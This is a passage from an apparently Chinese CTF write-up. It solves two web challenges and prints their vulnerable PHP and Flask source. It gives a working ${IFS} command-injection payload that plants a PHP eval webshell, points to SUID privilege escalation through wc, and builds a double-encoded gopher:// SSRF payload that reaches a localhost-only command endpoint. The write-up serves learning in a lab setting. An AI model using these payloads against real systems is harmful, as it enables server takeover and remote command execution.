&amp;&amp; password_verify($password, $this-&gt;users[$username])) {            $this-&gt;logger-&gt;log("User $username authenticated");            return "User $username authenticated";        }        return "Authentication failed";    }}class StringUtils {    public static function sanitize($input) {        return htmlspecialchars($input, ENT_QUOTES, 'UTF-8');    }    public static function generateRandomString($length = 10) {        return substr(str_shuffle(str_repeat($x = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length / strlen($x)))), 1, $length);    }}class InputValidator {    private $maxLength;    public function __construct($maxLength) {        $this-&gt;maxLength = $maxLength;    }    public function validate($input) {        if (strlen($input) &gt; $this-&gt;maxLength) {            return "Input exceeds maximum length of {$this-&gt;maxLength} characters";        }        return true;    }}class CommandExecutor {    private $logger;    public function __construct($logger) {        $this-&gt;logger = $logger;    }    public function execute($input) {        if (strpos($input, ' ') !== false) {            $this-&gt;logger-&gt;log("Invalid input: space detected");            die('No spaces allowed');        }        @exec($input, $output);        $this-&gt;logger-&gt;log("Result: $input");        return implode("\n", $output);    }}class ActionHandler {    private $config;    private $logger;    private $executor;    public function __construct($config, $logger) {        $this-&gt;config = $config;        $this-&gt;logger = $logger;        $this-&gt;executor = new CommandExecutor($logger);    }    public function handle($action, $input) {        if (!in_array($action, $this-&gt;config-&gt;get('allowed_actions'))) {            return "Invalid action";        }        if ($action === 'run') {            $validator = new InputValidator($this-&gt;config-&gt;get('max_input_length'));            $validationResult = $validator-&gt;validate($input);            if ($validationResult !== true) {                return $validationResult;            }            return $this-&gt;executor-&gt;execute($input);        } elseif ($action === 'debug') {            return "Debug mode enabled";        } elseif ($action === 'generate') {            return "Random string: " . StringUtils::generateRandomString(15);        }        return "Unknown action";    }}if (isset($_REQUEST['action'])) {    $config = new ConfigLoader();    $logger = new Logger($config-&gt;get('log_level'));    $actionHandler = new ActionHandler($config, $logger);    $input = $_REQUEST['input'] ?? '';    echo $actionHandler-&gt;handle($_REQUEST['action'], $input);} else {    $config = new ConfigLoader();    $logger = new Logger($config-&gt;get('log_level'));    $userManager = new UserManager($logger);    if (isset($_POST['register'])) {        $username = $_POST['username'];        $password = $_POST['password'];        echo $userManager-&gt;addUser($username, $password);    }    if (isset($_POST['login'])) {        $username = $_POST['username'];        $password = $_POST['password'];        echo $userManager-&gt;authenticate($username, $password);    }    $logger-&gt;log("No action provided, running default logic");} [LOG] No action provided, running default logic  #可以看到CommandExecutor很危险，直接exec,还有get会有一个action和input可传会进ActionHandler-&gt;handle();当action是run时，会创建InputValidator实例,检查输入长度是否超过100。如果通过验证，就调用CommandExecutor的execute方法.    ?action=run&amp;input=echo${IFS}"<span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token class-name type-declaration">php</span><span class="token variable">$</span><span class="token punctuation">{</span><span class="token constant">IFS</span><span class="token punctuation">}</span><span class="token keyword">eval</span><span class="token punctuation">(</span>\<span class="token variable">$_POST</span><span class="token punctuation">[</span>pass<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>"${IFS}&gt;pass.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>?action=run&amp;input=echo${IFS}"&lt; ?php${IFS}eval(\$_POST[pass]);?&gt;"${IFS}&gt;pass.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/c1354eb6de815a5b1d121d4d93b23413.png"></p><p><a href="https://www.cnblogs.com/yuy0ung/articles/18421470">Linux提权-suid相关提权思路 - Yuy0ung - 博客园</a></p><blockquote><p><strong>利用命令均可在这个网站上查询</strong>：<a href="https://gtfobins.github.io/">GTFOBins</a>，这里不再赘述</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/4ab32173dbaffe9feef5bf2e65685d71.png"></p><p>so,在里面搜wc,很容易就搜到了<a href="https://gtfobins.github.io/gtfobins/wc/">wc | GTFOBins</a></p><p>belike<img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/5e3648652af190111f64d06636a80234.png"></p><p>但要注意观察文档中的是在./wc,我们的是在/var/www/html/wc里，改一下。</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0eb54f9bba257bb9a467049a2238c7ae.png"></p><hr><h3 id="Goph3rrr"><a href="#Goph3rrr" class="headerlink" title="Goph3rrr"></a>Goph3rrr</h3><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/3c2b2514d5b7a3a4b0f6b8caf5a3fcc8.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> send_file<span class="token punctuation">,</span> render_template_string<span class="token keyword">import</span> os<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlparse<span class="token punctuation">,</span> urlunparse<span class="token keyword">import</span> subprocess<span class="token keyword">import</span> socket<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> base64<span class="token keyword">import</span> randomapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>BlackList <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">"127.0.0.1"</span><span class="token punctuation">]</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''    &lt;html&gt;        &lt;head&gt;            &lt;style&gt;                body {                    background-image: url('d‘）/* 背景图像 */                    background-size: cover; /* 背景图片覆盖整个页面 */                    height: 100vh; /* 页面高度填满浏览器窗口 */                    display: flex;                    justify-content: center; /* 水平居中 */                    align-items: center; /* 垂直居中 */                    color: white; /* 字体颜色 */                    font-family: Arial, sans-serif; /* 字体 */                    text-align: center; /* 文字居中 */                }                h1 {                    font-size: 50px;                    transition: transform 0.2s ease-in-out; /* 设置浮动效果过渡时间 */                }                h1:hover {                    transform: translateY(-10px); /* 向上浮动 */                }            &lt;/style&gt;        &lt;/head&gt;        &lt;body&gt;            &lt;h1&gt;Hello Ctfer!!! Welcome to the GHCTF challenge! (≧∇≦)&lt;/h1&gt;        &lt;/body&gt;    &lt;/html&gt;    '''</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/Login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    junk_code<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> username <span class="token keyword">in</span> users <span class="token keyword">and</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">==</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> b64e<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Welcome back, </span><span class="token interpolation"><span class="token punctuation">{</span>username<span class="token punctuation">}</span></span><span class="token string">!"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> b64e<span class="token punctuation">(</span><span class="token string">"Invalid credentials!"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""        &lt;!DOCTYPE html&gt;        &lt;html lang="en"&gt;        &lt;head&gt;            &lt;meta charset="UTF-8"&gt;            &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;            &lt;title&gt;Login&lt;/title&gt;            &lt;link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"&gt;            &lt;style&gt;                body {                    background-color: #f8f9fa;                }                .container {                    max-width: 400px;                    margin-top: 100px;                }                .card {                    border: none;                    border-radius: 10px;                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);                }                .card-header {                    background-color: #007bff;                    color: white;                    text-align: center;                    border-radius: 10px 10px 0 0;                }                .btn-primary {                    background-color: #007bff;                    border: none;                }                .btn-primary:hover {                    background-color: #0056b3;                }            &lt;/style&gt;        &lt;/head&gt;        &lt;body&gt;            &lt;div class="container"&gt;                &lt;div class="card"&gt;                    &lt;div class="card-header"&gt;                        &lt;h3&gt;Login&lt;/h3&gt;                    &lt;/div&gt;                    &lt;div class="card-body"&gt;                        &lt;form method="POST"&gt;                            &lt;div class="mb-3"&gt;                                &lt;label for="username" class="form-label"&gt;Username&lt;/label&gt;                                &lt;input type="text" class="form-control" id="username" name="username" required&gt;                            &lt;/div&gt;                            &lt;div class="mb-3"&gt;                                &lt;label for="password" class="form-label"&gt;Password&lt;/label&gt;                                &lt;input type="password" class="form-control" id="password" name="password" required&gt;                            &lt;/div&gt;                            &lt;button type="submit" class="btn btn-primary w-100"&gt;Login&lt;/button&gt;                        &lt;/form&gt;                    &lt;/div&gt;                &lt;/div&gt;            &lt;/div&gt;        &lt;/body&gt;        &lt;/html&gt;    """</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/Gopher'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">visit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> url <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"No url provided :)"</span>    url <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    realIpAddress <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>url<span class="token punctuation">.</span>hostname<span class="token punctuation">)</span>    <span class="token keyword">if</span> url<span class="token punctuation">.</span>scheme <span class="token operator">==</span> <span class="token string">"file"</span> <span class="token keyword">or</span> realIpAddress <span class="token keyword">in</span> BlackList<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"No (≧∇≦)"</span>    result <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"curl"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> urlunparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> capture_output<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    <span class="token comment">#urlunparse 是 urllib.parse 模块中的函数，用于将 urlparse 解析后的 URL 对象重新组合成 URL 字符串。</span>    <span class="token keyword">return</span> result<span class="token punctuation">.</span>stdout<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/RRegister'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    junk_code<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> username <span class="token keyword">in</span> users<span class="token punctuation">:</span>            <span class="token keyword">return</span> b64e<span class="token punctuation">(</span><span class="token string">"Username already exists!"</span><span class="token punctuation">)</span>        users<span class="token punctuation">[</span>username<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'password'</span><span class="token punctuation">:</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>        <span class="token keyword">return</span> b64e<span class="token punctuation">(</span><span class="token string">"Registration successful!"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""        &lt;!DOCTYPE html&gt;        &lt;html lang="en"&gt;        &lt;head&gt;            &lt;meta charset="UTF-8"&gt;            &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;            &lt;title&gt;Register&lt;/title&gt;            &lt;link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"&gt;            &lt;style&gt;                body {                    background-color: #f8f9fa;                }                .container {                    max-width: 400px;                    margin-top: 100px;                }                .card {                    border: none;                    border-radius: 10px;                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);                }                .card-header {                    background-color: #28a745;                    color: white;                    text-align: center;                    border-radius: 10px 10px 0 0;                }                .btn-success {                    background-color: #28a745;                    border: none;                }                .btn-success:hover {                    background-color: #218838;                }            &lt;/style&gt;        &lt;/head&gt;        &lt;body&gt;            &lt;div class="container"&gt;                &lt;div class="card"&gt;                    &lt;div class="card-header"&gt;                        &lt;h3&gt;Register&lt;/h3&gt;                    &lt;/div&gt;                    &lt;div class="card-body"&gt;                        &lt;form method="POST"&gt;                            &lt;div class="mb-3"&gt;                                &lt;label for="username" class="form-label"&gt;Username&lt;/label&gt;                                &lt;input type="text" class="form-control" id="username" name="username" required&gt;                            &lt;/div&gt;                            &lt;div class="mb-3"&gt;                                &lt;label for="password" class="form-label"&gt;Password&lt;/label&gt;                                &lt;input type="password" class="form-control" id="password" name="password" required&gt;                            &lt;/div&gt;                            &lt;button type="submit" class="btn btn-success w-100"&gt;Register&lt;/button&gt;                        &lt;/form&gt;                    &lt;/div&gt;                &lt;/div&gt;            &lt;/div&gt;        &lt;/body&gt;        &lt;/html&gt;    """</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/Manage'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">cmd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>remote_addr <span class="token operator">!=</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Forbidden!!!"</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Allowed!!!"</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/Upload'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload_avatar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    junk_code<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> username <span class="token keyword">not</span> <span class="token keyword">in</span> users<span class="token punctuation">:</span>            <span class="token keyword">return</span> b64e<span class="token punctuation">(</span><span class="token string">"User not found!"</span><span class="token punctuation">)</span>        <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'avatar'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">:</span>            <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>avatar_dir<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>username<span class="token punctuation">}</span></span><span class="token string">.png"</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> b64e<span class="token punctuation">(</span><span class="token string">"Avatar uploaded successfully!"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> b64e<span class="token punctuation">(</span><span class="token string">"No file uploaded!"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""        &lt;!DOCTYPE html&gt;        &lt;html lang="en"&gt;        &lt;head&gt;            &lt;meta charset="UTF-8"&gt;            &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;            &lt;title&gt;Upload Avatar&lt;/title&gt;            &lt;link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"&gt;            &lt;style&gt;                body {                    background-color: #f8f9fa;                }                .container {                    max-width: 400px;                    margin-top: 100px;                }                .card {                    border: none;                    border-radius: 10px;                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);                }                .card-header {                    background-color: #dc3545;                    color: white;                    text-align: center;                    border-radius: 10px 10px 0 0;                }                .btn-danger {                    background-color: #dc3545;                    border: none;                }                .btn-danger:hover {                    background-color: #c82333;                }            &lt;/style&gt;        &lt;/head&gt;        &lt;body&gt;            &lt;div class="container"&gt;                &lt;div class="card"&gt;                    &lt;div class="card-header"&gt;                        &lt;h3&gt;Upload Avatar&lt;/h3&gt;                    &lt;/div&gt;                    &lt;div class="card-body"&gt;                        &lt;form method="POST" enctype="multipart/form-data"&gt;                            &lt;div class="mb-3"&gt;                                &lt;label for="username" class="form-label"&gt;Username&lt;/label&gt;                                &lt;input type="text" class="form-control" id="username" name="username" required&gt;                            &lt;/div&gt;                            &lt;div class="mb-3"&gt;                                &lt;label for="avatar" class="form-label"&gt;Avatar&lt;/label&gt;                                &lt;input type="file" class="form-control" id="avatar" name="avatar" required&gt;                            &lt;/div&gt;                            &lt;button type="submit" class="btn btn-danger w-100"&gt;Upload&lt;/button&gt;                        &lt;/form&gt;                    &lt;/div&gt;                &lt;/div&gt;            &lt;/div&gt;        &lt;/body&gt;        &lt;/html&gt;    """</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/app.py'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">download_source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> send_file<span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.cnblogs.com/geekbruce/articles/18399689">Python中urllib.parse 里面的 urlparse 方法理解和使用 - AlphaGeek - 博客园</a></p><p>重定向和绕过都不行，有个urlparse,还需要是8000端口</p><p>内层Gopher协议+外层GET请求共两次编码，但要注意：</p><blockquote><p>需要注意的是，<code>quote()</code> 函数默认只对 ASCII 字符进行编码，对于非 ASCII 字符（如中文），你需要指定 <code>safe=''</code> 和 <code>encoding='utf-8'</code> 参数，以确保所有字符都被正确编码。</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse<span class="token comment"># 原始 HTTP 请求（换行符为 \n）</span>raw_request <span class="token operator">=</span> <span class="token triple-quoted-string string">"""POST /Manage HTTP/1.1Host: 127.0.0.1:8000Content-Type: application/x-www-form-urlencodedContent-Length: 7cmd=env"""</span><span class="token comment"># 对换行符和特殊字符进行编码</span>encoded_request <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>raw_request<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'%0A'</span><span class="token punctuation">,</span> <span class="token string">'%250A'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'%20'</span><span class="token punctuation">,</span> <span class="token string">'%2520'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'%3A'</span><span class="token punctuation">,</span> <span class="token string">'%253A'</span><span class="token punctuation">)</span><span class="token comment"># 拼接 Gopher URL</span>gopher_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"gopher://127.0.0.2:8000/_</span><span class="token interpolation"><span class="token punctuation">{</span>encoded_request<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token keyword">print</span><span class="token punctuation">(</span>gopher_url<span class="token punctuation">)</span><span class="token comment">#gopher://127.0.0.2:8000/_POST%2520%2FManage%2520HTTP%2F1.1%250AHost%253A%2520127.0.0.1%253A8000%250AContent-Type%253A%2520application%2Fx-www-form-urlencoded%250AContent-Length%253A%25207%250A%250Acmd%3Denv%250A</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>so,还是用工具吧</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ae20d30bd089551c5b858c4195dba089.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">/</span>Gopher?url<span class="token operator">=</span>gopher<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.2</span><span class="token punctuation">:</span><span class="token number">8000</span><span class="token operator">/</span>_POST<span class="token operator">%</span><span class="token number">2520</span><span class="token operator">%</span>252FManage<span class="token operator">%</span>2520HTTP<span class="token operator">%</span><span class="token number">252</span> F1<span class="token punctuation">.</span><span class="token number">1</span><span class="token operator">%</span>250Ahost<span class="token operator">%</span>253A127<span class="token punctuation">.</span><span class="token number">0.0</span><span class="token number">.1</span><span class="token operator">%</span>250AContent<span class="token operator">-</span>Type<span class="token operator">%</span>253Aapplication<span class="token operator">%</span>252Fx<span class="token operator">-</span>www<span class="token operator">-</span><span class="token keyword">for</span> m<span class="token operator">-</span>urlencoded<span class="token operator">%</span>250AContent<span class="token operator">-</span>Length<span class="token operator">%</span>253A7<span class="token operator">%</span>250A<span class="token operator">%</span>250Acmd<span class="token operator">%</span>253Denv  <span class="token operator">/</span>Gopher?url<span class="token operator">=</span>gopher<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.0</span><span class="token punctuation">:</span><span class="token number">8000</span><span class="token operator">/</span>_POST<span class="token operator">%</span><span class="token number">2520</span><span class="token operator">%</span>252FManage<span class="token operator">%</span>2520HTTP<span class="token operator">%</span><span class="token number">252</span> F1<span class="token punctuation">.</span><span class="token number">1</span><span class="token operator">%</span>250Ahost<span class="token operator">%</span>253A127<span class="token punctuation">.</span><span class="token number">0.0</span><span class="token number">.1</span><span class="token operator">%</span>250AContent<span class="token operator">-</span>Type<span class="token operator">%</span>253Aapplication<span 